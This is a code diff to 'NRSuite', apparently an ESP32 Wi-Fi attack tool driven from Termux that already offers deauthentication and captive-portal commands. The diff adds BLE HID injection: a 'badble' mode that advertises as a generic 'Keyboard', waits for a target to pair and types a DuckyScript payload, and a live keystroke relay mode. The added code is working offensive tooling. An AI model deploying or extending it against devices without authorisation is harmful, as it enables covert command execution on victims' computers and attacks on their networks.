@@ -59,11 +59,11 @@ def log(msg: str, color=None, level: str = "info"):
 def banner():
     logo = """
 \033[1;92m _____ _____ \033[1;96m_____     _ _       
-\033[1;92m|   | | __  |   __|_ _|_| |_ ___ 
+\033[1;92m|   | | __  |\033[1;96m   __|_ _|_| |_ ___ 
 \033[1;92m| | | |    -|\033[1;96m__   | | | |  _| -_|
 \033[1;92m|_|___|__|__|\033[1;96m_____|___|_|_| |___| v1.2
 
-\033[1;92m[+]\033[0m Github \033[4;92m@7wp81x\NRSuite\033[0m
+\033[1;92m[+]\033[0m Github \033[4;92m@7wp81x/NRSuite\033[0m
 """
     print(logo)
 
@@ -221,7 +221,7 @@ def _setup_bridge(fd=None):
         from usb_device import wrap_fd
         device = wrap_fd(fd)
 
-     log("Starting bridge, Please wait...", C.GREEN, level="ok")
+    log("Starting bridge, Please wait...", C.GREEN, level="ok")
     ep_in, ep_out, intf = get_cdc_endpoints(device)
     claim_device(device, intf, fd_wrapped=(fd is not None))
     init_cp2102_bridge(device)
@@ -582,6 +582,121 @@ def do_deauth(fd: int = None, args=None):
     log("Deauth finished.", C.GREEN)
 
 
+# ====================== BLE HID (badble / keyboard) ======================
+def do_ble_badble(fd: int = None, args=None):
+    log("Starting BLE HID (script mode)...", C.CYAN)
+
+    if not os.path.exists(args.payload):
+        log(f"Payload file not found: {args.payload}", C.RED, level="err")
+        return
+
+    with open(args.payload, "r") as f:
+        script = f.read()
+
+    _, rx, tx, proto = _setup_bridge(fd)
+    _drain_stale(rx)
+    _wait_for_ready(proto)
+    proto.start()
+    start_resp = proto.send_cmd("BLE_START", {"name": args.advertise}, timeout=8)
+    if not start_resp or not start_resp.get("ok"):
+        log("Failed to start BLE advertising.", C.RED, level="err")
+        proto.stop(); rx.stop(); rx.join(timeout=2)
+        return
+
+    log(f"Advertising as \033[1;92m{args.advertise}\033[0m — waiting for target to pair...", C.YELLOW)
+
+    deadline = time.time() + args.pair_timeout
+    connected = False
+    while time.time() < deadline:
+        status = proto.send_cmd("BLE_STATUS", timeout=3)
+        if status and status.get("connected"):
+            connected = True
+            log(f"Paired with {status.get('peer', 'unknown')}", C.GREEN, level="ok")
+            break
+        time.sleep(0.5)
+
+    if not connected:
+        log("Timed out waiting for BLE pairing.", C.RED, level="err")
+        proto.send_cmd("BLE_STOP", timeout=5)
+        proto.stop(); rx.stop(); rx.join(timeout=2)
+        return
+
+    log("Running payload...", C.CYAN)
+    if args.run_delay > 0:
+        time.sleep(args.run_delay)
+
+    resp = proto.send_cmd("BLE_RUN_SCRIPT", {"script": script}, timeout=max(30, len(script) // 20))
+
+    if resp and resp.get("ok"):
+        log(f"Payload finished ({resp.get('lines')} lines executed).", C.GREEN, level="ok")
+    else:
+        log("Payload execution failed or timed out.", C.RED, level="err")
+
+    if not args.keep_alive:
+        proto.send_cmd("BLE_STOP", timeout=5)
+
+    proto.stop()
+    rx.stop()
+    rx.join(timeout=3)
+
+
+def do_ble_keyboard(fd: int = None, args=None):
+    log("Starting BLE HID (realtime keyboard mode)...", C.CYAN)
+    log("Type on this terminal — keystrokes are relayed live. Ctrl+C to stop.", C.YELLOW)
+
+    _, rx, tx, proto = _setup_bridge(fd)
+    _drain_stale(rx)
+    _wait_for_ready(proto)
+    proto.start()
+    start_resp = proto.send_cmd("BLE_START", {"name": args.advertise}, timeout=8)
+    if not start_resp or not start_resp.get("ok"):
+        log("Failed to start BLE advertising.", C.RED, level="err")
+        proto.stop(); rx.stop(); rx.join(timeout=2)
+        return
+
+    log(f"Advertising as \033[1;92m{args.advertise}\033[0m — waiting for target to pair...", C.YELLOW)
+
+    deadline = time.time() + args.pair_timeout
+    connected = False
+    while time.time() < deadline:
+        status = proto.send_cmd("BLE_STATUS", timeout=3)
+        if status and status.get("connected"):
+            connected = True
+            log(f"Paired with {status.get('peer', 'unknown')}", C.GREEN, level="ok")
+            break
+        time.sleep(0.5)
+
+    if not connected:
+        log("Timed out waiting for BLE pairing.", C.RED, level="err")
+        proto.send_cmd("BLE_STOP", timeout=5)
+        proto.stop(); rx.stop(); rx.join(timeout=2)
+        return
+
+    # Minimal line-based passthrough: each line typed here is sent as a
+    # STRINGLN via the same script interpreter, one line at a time, so a
+    # single keystroke's worth of latency stays low without needing raw
+    # per-keypress terminal handling (termux stdin is line-buffered anyway).
+    try:
+        while True:
+            line = sys.stdin.readline()
+            if not line:
+                break
+            text = line.rstrip("\n")
+            if not text:
+                continue
+            proto.send_cmd("BLE_RUN_SCRIPT", {"script": f"STRINGLN {text}"}, timeout=10)
+    except KeyboardInterrupt:
+        log("\nStopping realtime session...", C.YELLOW)
+
+    proto.send_cmd("BLE_RELEASE_ALL", timeout=5)
+    if not args.keep_alive:
+        proto.send_cmd("BLE_STOP", timeout=5)
+
+    proto.stop()
+    rx.stop()
+    rx.join(timeout=3)
+
+
 # ====================== MAIN ======================
 def main():
     parser = argparse.ArgumentParser(description="NRSuite - ESP32 WiFi Tool")
@@ -618,9 +733,25 @@ def main():
     portal_p.add_argument("--channel", type=int, default=6)
     portal_p.add_argument("--bssid", help="Target BSSID for auto EAPOL")
     portal_p.add_argument("--file", help="HTML file to upload (for start or html action)")
-    
-    args = parser.parse_args()
 
+    # BLE HID
+    ble_p = subparsers.add_parser("ble", help="BLE HID keyboard / DuckyScript injection")
+    ble_sub = ble_p.add_subparsers(dest="ble_action", required=True)
+
+    badble_p = ble_sub.add_parser("badble", help="Run a DuckyScript payload over BLE")
+    badble_p.add_argument("--advertise", default="Keyboard", help="BLE device name to advertise")
+    badble_p.add_argument("--payload", required=True, help="Path to DuckyScript .txt file")
+    badble_p.add_argument("--pair-timeout", type=int, default=60, help="Seconds to wait for pairing")
+    badble_p.add_argument("--run-delay", type=float, default=0, help="Seconds to wait after pairing before running")
+    badble_p.add_argument("--keep-alive", action="store_true", help="Keep BLE advertising after payload finishes")
+
+    keyboard_p = ble_sub.add_parser("keyboard", help="Realtime keystroke passthrough from this terminal")
+    keyboard_p.add_argument("--advertise", default="Keyboard", help="BLE device name to advertise")
+    keyboard_p.add_argument("--pair-timeout", type=int, default=60, help="Seconds to wait for pairing")
+    keyboard_p.add_argument("--keep-alive", action="store_true", help="Keep BLE advertising after session ends")
+
+    args = parser.parse_args()
+    banner()
     from usb_device import detect_backend
 
     try:
@@ -630,7 +761,6 @@ def main():
         sys.exit(1)
 
     fd_str = os.environ.get("TERMUX_USB_FD")
-    banner()
     if backend == "root":
         if args.command == "scan":
             do_scan()
@@ -639,6 +769,9 @@ def main():
         elif args.command == "deauth":
             do_deauth(args=args)
         elif args.command == "portal": do_portal(args=args)
+        elif args.command == "ble":
+            if args.ble_action == "badble": do_ble_badble(args=args)
+            elif args.ble_action == "keyboard": do_ble_keyboard(args=args)
     elif fd_str is None:
         print("\033[0;93m[*]\033[0m Backend: termux-api (no-root)", file=sys.stderr)
         bootstrap(args.command, sys.argv[2:])
@@ -651,6 +784,9 @@ def main():
         elif args.command == "deauth":
             do_deauth(fd=fd, args=args)
         elif args.command == "portal": do_portal(fd=fd, args=args)
+        elif args.command == "ble":
+            if args.ble_action == "badble": do_ble_badble(fd=fd, args=args)
+            elif args.ble_action == "keyboard": do_ble_keyboard(fd=fd, args=args)
 
 
 if __name__ == "__main__":
